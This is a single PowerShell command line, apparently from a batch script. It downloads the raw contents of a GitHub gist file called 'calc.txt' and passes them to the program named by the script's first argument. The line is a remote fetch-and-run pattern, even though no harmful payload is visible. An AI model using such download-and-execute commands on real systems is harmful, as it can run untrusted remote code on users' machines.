powershell -Command "$data = (Invoke-WebRequest 'https://gist.github.com/roboisaac11/ed602fe3ae548ede132238f1138f166a/raw/251103de726311fe0bad3f3a4d766481c9602f9c/calc.txt').Content; %1 $data"
